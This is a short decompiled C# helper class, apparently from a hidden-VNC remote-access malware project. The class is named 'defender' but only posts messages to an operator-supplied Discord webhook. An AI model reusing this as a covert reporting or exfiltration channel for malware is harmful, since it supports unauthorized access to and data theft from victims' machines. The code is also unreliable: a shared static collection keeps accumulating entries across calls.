using System;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.CompilerServices;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000D5 RID: 213
	public class defender : IDisposable
	{
		// Token: 0x1700020E RID: 526
		// (get) Token: 0x060008BA RID: 2234 RVA: 0x0000ABD4 File Offset: 0x00008DD4
		// (set) Token: 0x060008BB RID: 2235 RVA: 0x0000ABDC File Offset: 0x00008DDC
        public string WebHook;

		// Token: 0x1700020F RID: 527
		// (get) Token: 0x060008BC RID: 2236 RVA: 0x0000ABE5 File Offset: 0x00008DE5
		// (set) Token: 0x060008BD RID: 2237 RVA: 0x0000ABED File Offset: 0x00008DED
        public string UserName;

		// Token: 0x17000210 RID: 528
		// (get) Token: 0x060008BE RID: 2238 RVA: 0x0000ABF6 File Offset: 0x00008DF6
		// (set) Token: 0x060008BF RID: 2239 RVA: 0x0000ABFE File Offset: 0x00008DFE
        public string ProfilePicture;

		// Token: 0x060008C0 RID: 2240 RVA: 0x0000AC07 File Offset: 0x00008E07
		public defender()
		{
			dWebClient = new WebClient();
		}

		// Token: 0x060008C1 RID: 2241 RVA: 0x0005DA9C File Offset: 0x0005BC9C
		public void SendMessage(string msgSend)
		{
			discordValues.Add("username", UserName);
			discordValues.Add("avatar_url", ProfilePicture);
			discordValues.Add("content", msgSend);
			dWebClient.UploadValues(WebHook, discordValues);
		}

		// Token: 0x060008C2 RID: 2242 RVA: 0x0000AC1A File Offset: 0x00008E1A
		public void Dispose()
		{
			dWebClient.Dispose();
		}

		// Token: 0x060008C3 RID: 2243 RVA: 0x0000AC27 File Offset: 0x00008E27
		// Note: this type is marked as 'beforefieldinit'.
		static defender()
		{
		}

		// Token: 0x04000710 RID: 1808
		private readonly WebClient dWebClient;

		// Token: 0x04000711 RID: 1809
		private static NameValueCollection discordValues = new NameValueCollection();


	}
}
